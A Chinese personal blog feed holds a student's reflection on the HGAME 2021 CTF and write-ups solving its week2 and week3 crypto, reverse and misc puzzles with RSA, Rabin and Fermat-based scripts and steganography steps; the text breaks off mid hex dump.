没有system函数”，然后又反思了半小时，决定还是先看完汇编。花了两天快马加鞭囫囵吞枣看完汇编后（跳过了一点点题目，主要还是答案看懂了就过，不是好做法），又打开了ida看，发现还是不知道怎么做，只有汇编比之前懂一点（，在大量的google搜索后，其实分不清shellcode和ROP啥的，只是眼熟了这些词，还有ret2libc123啥的（这个时候还没想起来开wiki看看），还花了大量时间重装一个kali和安装各种各样的软件，比如pwndbg和python（python也是刚接触没多久，对它有深深的恐惧），大量google后，我茫然地觉得letter应该是属于ret2libc3题型，当时并不知道shellcode和泄露libc是哪些适用的题型，也不知道shellcode原来是不用自己写的（doge），就尝试用别人的exp改一下看看能不能用，结果当然是疯狂报错，期间倒是学习到了很多pwn基础的知识，啃栈溢出原理和泄露原理，因为不熟悉python也不熟悉pwntools，更不会用gdb，就很茫然地在google搜索各种“pwn入门教程”中度过了这一周，当然分数也意料之中地很低（doge）。</p><h3 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h3><p>​第二周开始是先做了crypto，先做了白给的RSA题，对RSA有了比较多的了解，也找到了比较全面的资料，做那几题RSA的时候还是比较顺利的，也是学到了很多东西。然后做misc，misc1卡了特别特别久，其实密码和工具都拿到了，然后愣是不知道输密码要加“ ”orzzzzz，就没做出这题。misc2和3的话其实耗时也是比较多的，只能感慨搜索引擎的强大，慢慢地一点一点google还是能找出来，就是misc3的时候以为那串base64码是data url，卡了比较长的时间，后来问热心学长也顺利解决了问题，做完这些事情已经过去了三四天了，然后误打误撞地尝试做RE，慢慢推理也做了出来。但由于week2又是过年，家里事情比较繁忙，时间也比较少，基本上只有一些零碎一点的时间可以看看资料，然后week2就也这样过去了。但是这周虽然做出的题比上一周多，但是我在pwn上的提高几近为0，其实是不怎么满意的orz，最主要还是更想学pwn，但是pwn对我来说困难还是太多了，不好得分，就只能把它往后放放。</p><h3 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h3><p>​第三周是同样的先做crypto和misc，但是这周的题难度确实比上周大了不少，不断尝试和碰壁之后，做出了两道crypto题，上一周学到的RSA知识在这周还是很管用的，另外在练习写脚本和改脚本的过程中，脚本能力也有了很大进步，至少对长脚本不那么害怕了orz。但是这周的misc我看题目确实没办法做出来，结束以后看wp发现主要问题还是对web知识匮乏（web又又又来了），wireshark也看不出个什么，就很茫然的做了很久的无用功，google流量分析找到的blog好像也不太适合这些题目，茫然地找了很久也找不到什么方向，遂弃之。接下来的几天就打算从头看一下wiki的pwn板块，从栈溢出开始看起，然后上网找了一些例题看wp，又学了学pwntools之类的，对于pwn题的理解确实也提高了不少，但是都是看别人的解题过程，自己解题的能力很低，然后尝试做pwn题的时候确实遇到了挺多困难的，而且根本不知道问题出在哪里、该怎么解决（，照着别人的脚本去写，但是返回信息不知道在哪里出了问题，orz然后就重新先去学gdb之类的，到week3结束也没能做出那道题，其实对自己还是挺失望的，感觉还是得先从一些更简单的题目慢慢练起，对程序的很多知识理解得不透就去照着别人的脚本做题，白白浪费了很多时间还做不出题目，得不到提高，这就是浮沙筑高台的结果（doge）。</p><h3 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h3><p>​第四周相比前三周来说，其实是最痛苦的一周，前面几天一直在做crypto和misc，crypto1这题确实暴露了我在使用python的脚本能力上很大的弱点，找到了比较全面的资料也能理解，但是在自己动手写脚本的时候就遇到特别多的困难，包括在使用一些函数和库方面，还有在解决报错方面，在debug上等等，由于之前大部分是使用现有的轮子进行修改，基本上都能不出错，但是这次是要自己写脚本，就问题还是在于python用的太少，以至于找不到问题的解决方法。接下来是尝试做了其他crypto、misc、pwn题，都不太找得到思路，然后又因为前面crypto1脚本一直报错又找不到解决方法，再加上总分数比较靠后，人已经陷入比较大的焦虑里，到了周四周五的时候，不太能找到做题的方向，丧失了很大的信心，又因为前几周积累的压力可能比较大，精神状态变得有点糟糕，最后两天是放下了题目决定休息一下准备开学了。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​最后虽然没进final，我也做好了没进的准备了orz，但是从整个比赛来说，最珍贵的应该是对ctf各种方向的学习内容和方向有了大致初步的了解，而且也找到了一些好的学习网站，相比于一开始的我确实是成长了非常多，具备了一定的自主学习能力和学习方向，可以不那么依赖外界的帮助，也发现了自己对安全是比较有兴趣的。但是其实还是有点缺憾，这一个月下来的结果其实跟我一开始设想不太一样，我在整个比赛中主要做的还是crypto和misc，但是我一直更想学的还是pwn，只是因为这两个方向好得分一点，而且我在pwn上的基础可以说几乎没有，就没办法在这个方向上得分，所以整个比赛下来自己是比较功利性的（这也是我焦虑的来源），把大部分时间都放在容易得分的题目上，我在pwn方向上的提高并没有我期望的那么高，就这点而言，我就觉得我暂时是配不上进入vidar的，所以也打算今年多去尝试自主学习，沉淀下自己的能力，明年再尝试一次。</p><h2 id="接下来的规划"><a href="#接下来的规划" class="headerlink" title="接下来的规划"></a>接下来的规划</h2><p>​下学期除了多花时间在安全方面，在这方面的兴趣还是比较浓厚的，也有意向自学一下java和go语言的用法，暑期与同学一起尝试自己写一个博客，但是最主要的还是从比较基础的知识学习一下pwn，希望能够有令自己满意的提高。</p>]]></content>
    
    
    <categories>
      
      <category>随记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HGAME2021-week3-writeup</title>
    <link href="/2021/03/02/HGAME2021-week3-writeup/"/>
    <url>/2021/03/02/HGAME2021-week3-writeup/</url>
    
    <content type="html"><![CDATA[<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="LikiPrime"><a href="#LikiPrime" class="headerlink" title="LikiPrime"></a>LikiPrime</h3><p>打开文件，注意到n巨大，无法直接分解，就安装下RsaCtfTool</p><p>把n，e转换为pem格式</p><p><img src="/2021/03/02/HGAME2021-week3-writeup/likip1.png"></p><p>然后将公钥复制进公钥文件里，根据公钥生成私钥</p><p><img src="/2021/03/02/HGAME2021-week3-writeup/likip2.png"></p><p>复制生成私钥文件</p><p><img src="/2021/03/02/HGAME2021-week3-writeup/likp3.png"></p><p>这个时候我们得到了私钥的pem格式，这个也就是说包含了d的信息，就可以把pem文件转化为n，d的信息</p><p><img src="/2021/03/02/HGAME2021-week3-writeup/likip4.png"></p><p>把d复制出来，就可以使用普通的rsa解密脚本了，这里有个小知识是，此时尽管我们得到了p和q，但是在产生n且生成公钥后，p和q就对解密没有作用了，只需n,e,d,m即可知三求四</p><p>exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> libnum import *<br>import gmpy2<br><span class="hljs-attribute">n</span>=4642849048052035496503633704895293631217710721048480643093066273453539020606503262957979920725495980644474381582401987659483845087785158995583524801974411600660004469521606043828464398381268385741839106107679152285268052785693531737782078311412427416352729645020533101979297815795100035083401887319200662906616821028586789590684789335443762752043629342084834798459618090474753253355410561025472128675037918666523107644910740766105028826314730599018497495492862063800728778692600588195828882048829807212192836385765558385158246669780622288906919083808249111381934780442102461915714453842511870245498903113416571527386297776743000577518964642712819636358630943232264563917498926813595742655374586197861677713568434392710229546068989680236075964913194705687047171077181794254991201877951298787735833716867844575889175057579515311685026867586635553290478360204470269221020803623311502253981426403357439672206326373095909967452469101986678489532087651064918868164697149776944867269827599290237695205317934537972522935809557398527602978413852968190796168743729293895475224641537<br><span class="hljs-attribute">e</span>=65537<br><span class="hljs-attribute">c</span>=3709687551802386646797745785768157879027050609328977568885694731790584712579460465408758306613418567415962830795763454102850272567805909067742475171434530819531323376762844483425142978584670535444556910298311158785244674346185024586744190434166742125402447427024641211299910710700413830069657814167275425086366608186529488973158968024470128222042394722196376369742747012091512362855985796568473133834299704823506724715371622279556576084964319045329385472170502455939280390354138230655997516781374667410921562926248428641624886673723671977041119253922097666216435834216534775971559961023171740810001108875247411400798441332102418344668326564692867689781292248240788343422559465238855056753381648550466898132110941192653170182675007266069504079999064268167773997215580322970078352817713636962794995378965132037968244297009426849367741958926566007286341995187592351353620716142926816093473621244503025516637410519157727321213682617984888429087571356484732639348442588172026432665938014397255748542136399980171709114519127932101071316178153942329339451067510373501385994955068<br><span class="hljs-attribute">d</span>=770773725419322614736096170243691269170830105818201464773373225127401384625459747943647428742441617245401548310367176186508144018723812958663789154912211395321434435942979900771376362274565513173798151799007418357015371687876247391657674474391064746477832347190493921747024737718398589830285373667285704448235210839541392964991539252172484836691253600895417895345234673914968878595402017952065468371953229793264961110654093070865344182897907601093245813936874030965739554262217795080183921897180793596028747028738137662679597765188531565728887340986161397150246232036553519792079001163180694624897916603106343065963758602553926821994399899387763161456806939859495324306883688456099721430769144536235331619886299618985907519204331418792099350868416283322724256163197443146202212692357518249688129160250090117488224473364207648003633976797404611385404362182887064564770724540482831043005176387272197349168925019470641628096392062982237553509096120775879454378983657609664663657876869899429824195166894468110681582491514529961338691940192460421091657400961588382452823337473<br><br><span class="hljs-attribute">m</span>=pow(c,d,n)<br><span class="hljs-built_in">print</span>(hex(m))<br><span class="hljs-attribute">m</span>=n2s(m)<br><span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure><h3 id="HappyNewYear"><a href="#HappyNewYear" class="headerlink" title="HappyNewYear!!"></a>HappyNewYear!!</h3><p>打开output发现是7组e,n,c，且e相同，可以推测是低加密指数广播攻击，用普通的脚本试了下发现是堆乱码</p><p><img src="/2021/03/02/HGAME2021-week3-writeup/ne1.png"></p><p>推测7组信息并非由同一个message得来，就加个循环，排列组合，每次用三组明文求密文</p><p>exp</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs prolog">import random<br>from gmpy2 import invert, iroot<br>from libnum import *<br><br>n1=...<br>c1=...<br>n2=...<br>c2=...<br>...<br>...    #篇幅过长省略，把output复制进来<br>e=<span class="hljs-number">3</span><br><br>def broadcast(n1, n2 ,n3, c1, c2, c3):<br>    n = [n1, n2, n3]<br>    <span class="hljs-symbol">C</span> = [c1, c2, c3]<br>    <span class="hljs-symbol">N</span> = <span class="hljs-number">1</span><br>    for i in n:<br>        <span class="hljs-symbol">N</span> *= i<br><br>    <span class="hljs-symbol">Ni</span> = []<br>    for i in n:<br>        <span class="hljs-symbol">Ni</span>.append(<span class="hljs-symbol">N</span> / i)<br><br>    <span class="hljs-symbol">T</span> = []<br>    for i in xrange(<span class="hljs-number">3</span>):<br>        if(gcd(<span class="hljs-symbol">Ni</span>[i],n[i]) == <span class="hljs-number">1</span>):<br>            <span class="hljs-symbol">T</span>.append(long(invert(<span class="hljs-symbol">Ni</span>[i], n[i])))<br>        else:<br>            return <span class="hljs-number">0</span><br><br>    <span class="hljs-symbol">X</span> = <span class="hljs-number">0</span><br>    for i in xrange(<span class="hljs-number">3</span>):<br>        <span class="hljs-symbol">X</span> += <span class="hljs-symbol">C</span>[i] * <span class="hljs-symbol">Ni</span>[i] * <span class="hljs-symbol">T</span>[i]<br><br>    m3 = <span class="hljs-symbol">X</span> <span class="hljs-comment">% N</span><br>    m = iroot(m3, <span class="hljs-number">3</span>)<br>    return m[<span class="hljs-number">0</span>]<br><br>def main():<br>    e = <span class="hljs-number">3</span><br>    n=[n1,n2,n3,n4,n5,n6,n7]<br>    c=[c1,c2,c3,c4,c5,c6,c7]<br>    for i in range(<span class="hljs-number">0</span>,<span class="hljs-number">5</span>):<br>        for j in range(i,<span class="hljs-number">6</span>):<br>            for z in range(j,<span class="hljs-number">7</span>):<br>                m = broadcast(n[i],n[j],n[z],c[i],c[j],c[z])<br>                print m<br>                m=n2s(m)<br>                print m<br><br>if <span class="hljs-symbol">__name__</span>==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>然后就在一大堆乱码中得出一点点信息</p><p><img src="/2021/03/02/HGAME2021-week3-writeup/ne2.png"></p><p><img src="/2021/03/02/HGAME2021-week3-writeup/ne3.png"></p><p><code>@ind3r~YOu^9ot=i7&#125;</code></p><p><code>hgame&#123;!f+y0u-pl4y_rem</code></p><p>就得到了flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf-hgame2021</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HGAME2021-week2-writeup</title>
    <link href="/2021/03/02/HGAME2021-week2-writeup-0/"/>
    <url>/2021/03/02/HGAME2021-week2-writeup-0/</url>
    
    <content type="html"><![CDATA[<h1 id="week2-writeup-6vv"><a href="#week2-writeup-6vv" class="headerlink" title="week2-writeup-6vv+"></a>week2-writeup-6vv+</h1><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="fake-debugger-beta"><a href="#fake-debugger-beta" class="headerlink" title="fake_debugger beta"></a>fake_debugger beta</h3><p>先输入个hgame{aaaaaaaaaaaaaa}试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs --------------INFO--------------"> <br>eax: 127<br>ebx: 23<br>ecx: 0<br>zf: 0h<br>--------------INFO--------------<br> <br>eax: 127<br>ebx: 127<br>ecx: 0<br>zf: 1<br>--------------INFO--------------<br> <br>eax: 74<br>ebx: 45<br>ecx: 1<br>zf: 0g<br>--------------INFO--------------<br> <br>eax: 74<br>ebx: 74<br>ecx: 1<br>zf: 1<br>--------------INFO--------------<br> <br>eax: 34<br>ebx: 67<br>ecx: 2<br>zf: 0a<br>--------------INFO--------------<br> <br>eax: 34<br>ebx: 34<br>ecx: 2<br>zf: 1<br>--------------INFO--------------<br> <br>eax: 52<br>ebx: 89<br>ecx: 3<br>zf: 0m<br>--------------INFO--------------<br> <br>eax: 52<br>ebx: 52<br>ecx: 3<br>zf: 1<br>--------------INFO--------------<br> <br>eax: 104<br>ebx: 13<br>ecx: 4<br>zf: 0e<br>--------------INFO--------------<br> <br>eax: 104<br>ebx: 104<br>ecx: 4<br>zf: 1<br>--------------INFO--------------<br> <br>eax: 99<br>ebx: 24<br>ecx: 5<br>zf: 0&#123;<br>--------------INFO--------------<br> <br>eax: 99<br>ebx: 99<br>ecx: 5<br>zf: 1<br>--------------INFO--------------<br> <br>eax: 66<br>ebx: 35<br>ecx: 6<br>zf: 0a<br><br></code></pre></td></tr></table></figure><p>可以看到，输入不同字符会改变eax的值，而正确的字符的ascii码为eax异或ebx，然后正确的eax值是zf&#x3D;1时ebx的值，因此只需要计算每一轮zf分别等于0和1时ebx的值的异或，ecx表示循环次数，可以用来判断第几位字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs --------------INFO--------------">eax: 65<br>ebx: 35<br>ecx: 6<br>zf: 0<br>--------------INFO--------------<br> <br>eax: 65<br>ebx: 122<br>ecx: 6<br>zf: 1122 xor 35 = 89 (Y)<br>--------------INFO--------------<br></code></pre></td></tr></table></figure><p>以此一位一位地类推，得到flag</p><p><code>hgame&#123;You_Kn0w_debuGg3r&#125;</code></p><p>就是有点费键盘</p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="whitegiveRSA"><a href="#whitegiveRSA" class="headerlink" title="whitegiveRSA"></a>whitegiveRSA</h3><p>公钥与私钥的产生：</p><p>(1)进行加密之前，首先找出2个不同的大质数p和q</p><p>(2)计算n&#x3D;p*q</p><p>(3)根据欧拉函数，求得φ(n)&#x3D;φ(p)φ(q)&#x3D;(p−1)(q−1)</p><p>(4)找出一个公钥e，e要满足: 1&lt;e&lt;φ(n) 的整数，且使e和φ(N)互质。</p><p>(5)根据e*d除以φ(n)余数为1，找到私钥d。</p><p>(6)所以,公钥就是(n,e) 私钥就是(n,d)</p><p>消息加密:</p><p>m^e除以n求余数即为c(密文)</p><p><img src="https://pic4.zhimg.com/80/v2-b217278d1613737321f72d41e5a37453_1440w.jpg" alt="img"></p><p>消息解密:</p><p>c^d除以n求余数即为m(明文)</p><p><img src="https://pic4.zhimg.com/80/v2-6e066085ca916978359bd73744fad5bb_1440w.jpg" alt="img"></p><figure class="highlight plaintext"><figcaption><span>binascii</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs import">import gmpy2<br>n=882564595536224140639625987659416029426239230804614613279163<br>#这里我用yafu分解了n<br>p=857504083339712752489993810777<br>q=1029224947942998075080348647219<br>e=65537<br>c=747831491353896780365654517748216624798517769637260742155527<br>phi=(p-1)*(q-1)<br>d=gmpy2.invert(e,phi)<br>m=pow(c,d,n)<br>print(hex(m))<br>print(binascii.unhexlify(hex(m)[2:].strip(&quot;L&quot;)))<br></code></pre></td></tr></table></figure><p><img src="/2021/03/02/HGAME2021-week2-writeup-0/rsa1.png"></p><h3 id="gcd-or-more"><a href="#gcd-or-more" class="headerlink" title="gcd or more?"></a>gcd or more?</h3><p>e&#x3D;2，用上一题的脚本显示找不到d，百度到了rabin加密</p><p><code>https://en.wikipedia.org/wiki/Rabin_cryptosystem</code></p><p>然后题目直接给出了p和q，不用手动分解n，就直接套公式解，从四个输出中找可能存在的真正明文</p><p>exp</p><figure class="highlight plaintext"><figcaption><span>binascii</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs import">import gmpy2<br>import libnum<br>p = 85228565021128901853314934583129083441989045225022541298550570449389839609019<br>q = 111614714641364911312915294479850549131835378046002423977989457843071188836271<br>n = p * q<br>#cipher = pow(s2n(FLAG), 2, n)<br>#print(cipher)<br>c=7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539<br>e=2<br><br><br>mp = pow(c, (p + 1) / 4, p)<br>mq = pow(c, (q + 1) / 4, q)<br>yp = gmpy2.invert(p, q)<br>yq = gmpy2.invert(q, p)<br>r = (yp * p * mq + yq * q * mp) % n<br>rr = n - r<br>s = (yp * p * mq - yq * q * mp) % n<br>ss = n - s<br>print libnum.n2s(r)<br>print libnum.n2s(rr)<br>print libnum.n2s(s)<br>print libnum.n2s(ss)<br></code></pre></td></tr></table></figure><p><img src="/2021/03/02/HGAME2021-week2-writeup-0/gcd1.png"></p><p><code>hgame&#123;3xgcd~is~really~difficult&#125;(狗头）</code></p><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p>#竟是数学题</p><p>c&#x3D;a^p*m（mod p）</p><p>c&#x3D;(a^p%p)*(m%p)%p     </p><p>c&#x3D;(a%p)*(m%p)%p      #费马小定理</p><p>c&#x3D;a*(m%p)%p </p><p>c*a^(p-2)&#x3D;m%p      #费马小定理</p><p>exp</p><figure class="highlight plaintext"><figcaption><span>libnum import *</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs from">a = 143476170144915086020651461328049339656692126954818003650099852868145841319041470073020587125213976925474341076505642227853407676058773113885865826640680023147360447444464935801614525784110903480871654141802517672864060026452463495645509064414259143561988416176609991854421929607534242834743124652491022090289<br>p = 144990456446230144694263694418769858495021475043392279183925650174062004178559844401086360607928511714506442495515664176646230769554023179040226957152981442993492885354384799122222074255748702871095896167656675843624069307328779207379633792655160544271545569917511963865120135589875939937494010889658831130797<br>c = 120094382885627426802043931936833471575878884523974767764562747592243608117847482125722859363444069094268578813034406859087905808108331619918394213908184448430084247326673068817903131008945590119114470183031722078599931222887555377046173518111618239410979061284925061871538324577871419928874075180494037057601<br>p2=p-2<br>am=pow(a,p2,p)<br>cm=c*am<br>m=cm%p<br>print(hex(m))<br>m=n2s(m)<br>print(m)<br></code></pre></td></tr></table></figure><p><img src="/2021/03/02/HGAME2021-week2-writeup-0/rsa2.png"></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="Telegraph：1601-6639-3459-3134-0892"><a href="#Telegraph：1601-6639-3459-3134-0892" class="headerlink" title="Telegraph：1601 6639 3459 3134 0892"></a>Telegraph：1601 6639 3459 3134 0892</h3><p>这名字很可疑，百度一下，我就知道</p><p><img src="/2021/03/02/HGAME2021-week2-writeup-0/tel1.png"></p><p>好吧，那咱打开au，显示频谱</p><p><img src="/2021/03/02/HGAME2021-week2-writeup-0/tel2.png"></p><p>打开滤波器，过滤850Hz</p><p><img src="/2021/03/02/HGAME2021-week2-writeup-0/tel3.png"></p><p>oh我的上帝，这熟悉的点杠隔</p><p><img src="/2021/03/02/HGAME2021-week2-writeup-0/tel4.png"></p><p>然后把莫斯电码写下来</p><p>-.–&#x2F;—&#x2F;..-&#x2F;.-.&#x2F;..-.&#x2F;.-..&#x2F;.-&#x2F;–.&#x2F;..&#x2F;…&#x2F;—…&#x2F;….-&#x2F;–.&#x2F;—–&#x2F;—–&#x2F;-..&#x2F;…&#x2F;—–&#x2F;-.&#x2F;–.&#x2F;-…&#x2F;..-&#x2F;-&#x2F;-.&#x2F;—–&#x2F;-&#x2F;….-&#x2F;–.&#x2F;—–&#x2F;—–&#x2F;-..&#x2F;–&#x2F;.-&#x2F;-.&#x2F;—–&#x2F;…–&#x2F;—-.&#x2F;…–&#x2F;.—-&#x2F;—–&#x2F;-.-&#x2F;..</p><p>解密得</p><p><code>yourflagis:4g00ds0ngbutn0t4g00dman039310ki</code></p><p>转化大写包上hgame{}就能交</p><h3 id="Hallucigenia"><a href="#Hallucigenia" class="headerlink" title="Hallucigenia"></a>Hallucigenia</h3><p>放进stegsolve康康有小惊喜</p><p><img src="/2021/03/02/HGAME2021-week2-writeup-0/mul1.png"></p><p>扫一扫</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gmBCrkRORUkAAAAA+jrgsWajaq0BeC3IQhCEIQhCKZw1MxTzSlNKnmJpivW9IHVPrTjvkkuI3sP7bWAEdIHWCbDsGsRkZ9IUJC9AhfZFbpqrmZBtI+ZvptWC<span class="hljs-regexp">/KCPrL0gFeRPOcI2WyqjndfUWlNj+dgWpe1qSTEcdurXzMRAc5EihsEflmIN8RzuguWq61JWRQpSI51/</span>KHHT<span class="hljs-regexp">/6/</span>ztPZJ33SSKbieTa1C5koONbLcf9aYmsVh7RW6p3SpASnUSb3JuSvpUBKxscbyBjiOpOTq8jcdRsx5<span class="hljs-regexp">/IndXw3VgJV6iO1+6jl4gjVpWouViO6ih9ZmybSPkhaqyNUxVXpV5cYU+Xx5sQTfKystDLipmqaMhxIcgvplLqF/</span>LWZzIS5PvwbqOvrSlNHVEYchCEIQISICSZJijwu50rRQHDyUpaF0y<span class="hljs-regexp">//</span><span class="hljs-regexp">/p6FEDCCDFsuW7YFoVEFEST0BAACLgLOrAAAAAggUAAAAtAAAAFJESEkNAAAAChoKDUdOUIk=</span><br></code></pre></td></tr></table></figure><p>b64解出来看见行末有个GNP.根据题目应该是要翻转过来</p><figure class="highlight plaintext"><figcaption><span>60 42 AE 44 4E 45 49  00 00 00 00 FA 3A E0 B1</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs 82">00 01 02 03 04 05 06 07  08 09 0A 0B 0C 0D 0E 0F <br>--------------------------------------------------------------------<br>82 60 42 AE 44 4E 45 49  00 00 00 00 FA 3A E0 B1   | .`B.DNEI.....:..<br>66 A3 6A AD 01 78 2D C8  42 10 84 21 08 42 29 9C   | f.j..x-.B..!.B).<br>35 33 14 F3 4A 53 4A 9E  62 69 8A F5 BD 20 75 4F   | 53..JSJ.bi... uO<br>AD 38 EF 92 4B 88 DE C3  FB 6D 60 04 74 81 D6 09   | .8..K....m`.t...<br>B0 EC 1A C4 64 67 D2 14  24 2F 40 85 F6 45 6E 9A   | ....dg..$/@..En.<br>AB 99 90 6D 23 E6 6F A6  D5 82 FC A0 8F AC BD 20   | ...m#.o........ <br>15 E4 4F 39 C2 36 5B 2A  A3 9D D7 D4 5A 53 63 F9   | ..O9.6[*....ZSc.<br>D8 16 A5 ED 6A 49 31 1C  76 EA D7 CC C4 40 73 91   | ....jI1.v....@s.<br>22 86 C1 1F 96 62 0D F1  1C EE 82 E5 AA EB 52 56   | &quot;....b........RV<br>45 0A 52 23 9D 7F 28 71  D3 FF AF F3 B4 F6 49 DF   | E.R#.(q......I.<br>74 92 29 B8 9E 4D AD 42  E6 4A 0E 35 B2 DC 7F D6   | t.)..M.B.J.5...<br>98 9A C5 61 ED 15 BA A7  74 A9 01 29 D4 49 BD C9   | ...a....t..).I..<br>B9 2B E9 50 12 B1 B1 C6  F2 06 38 8E A4 E4 EA F2   | .+.P......8.....<br>37 1D 46 CC 79 FC 89 DD  5F 0D D5 80 95 7A 88 ED   | 7.F.y..._....z..<br>7E EA 39 78 82 35 69 5A  8B 95 88 EE A2 87 D6 66   | ~.9x.5iZ.......f<br>C9 B4 8F 92 16 AA C8 D5  31 55 7A 55 E5 C6 14 F9   | ........1UzU....<br>7C 79 B1 04 DF 2B 2B 2D  0C B8 A9 9A A6 8C 87 12   | |y...++-........<br>1C 82 FA 65 2E A1 7F 2D  66 73 21 2E 4F BF 06 EA   | ...e..-fs!.O...<br>3A FA D2 